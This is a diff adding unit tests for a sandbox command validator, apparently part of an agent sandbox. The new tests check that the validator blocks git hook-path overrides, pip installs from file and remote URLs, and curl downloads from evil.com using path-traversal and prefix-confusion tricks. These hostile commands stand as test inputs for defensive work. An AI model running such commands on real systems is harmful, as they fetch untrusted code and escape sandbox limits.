@@ -309,6 +309,12 @@ describe('SandboxCommandValidator', () => {
       if (!result.valid) expect(result.reason).toContain('hooks');
     });
 
+    test('blocks git -c core.hookspath case-insensitive', () => {
+      const result = validator.validateCommand('git -c core.hookspath=/evil pull');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('hooks');
+    });
+
     test('allows git clone', () => {
       expect(validator.validateCommand('git clone https://example.com/repo.git')).toEqual({
         valid: true,
@@ -339,6 +345,20 @@ describe('SandboxCommandValidator', () => {
       if (!result.valid) expect(result.reason).toContain('URL');
     });
 
+    test('blocks pip install from file:// URL', () => {
+      const result = validator.validateCommand('pip install file:///tmp/evil-pkg');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('URL');
+    });
+
+    test('blocks pip --isolated install from URL (global opts before subcommand)', () => {
+      const result = validator.validateCommand(
+        'pip --isolated install https://evil.com/pkg.tar.gz',
+      );
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('URL');
+    });
+
     test('blocks pip install from absolute path outside workspace', () => {
       const result = validator.validateCommand('pip install /tmp/evil-pkg');
       expect(result.valid).toBe(false);
@@ -361,6 +381,22 @@ describe('SandboxCommandValidator', () => {
 
     test('blocks curl --output= to absolute path outside workspace', () => {
       const result = validator.validateCommand('curl --output=/usr/bin/payload https://evil.com');
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('workspace');
+    });
+
+    test('blocks curl -o /workspace/../tmp/payload (path traversal)', () => {
+      const result = validator.validateCommand(
+        'curl -o /workspace/../tmp/payload https://evil.com',
+      );
+      expect(result.valid).toBe(false);
+      if (!result.valid) expect(result.reason).toContain('workspace');
+    });
+
+    test('blocks curl -o /workspace-backdoor/payload (prefix confusion)', () => {
+      const result = validator.validateCommand(
+        'curl -o /workspace-backdoor/payload https://evil.com',
+      );
       expect(result.valid).toBe(false);
       if (!result.valid) expect(result.reason).toContain('workspace');
     });
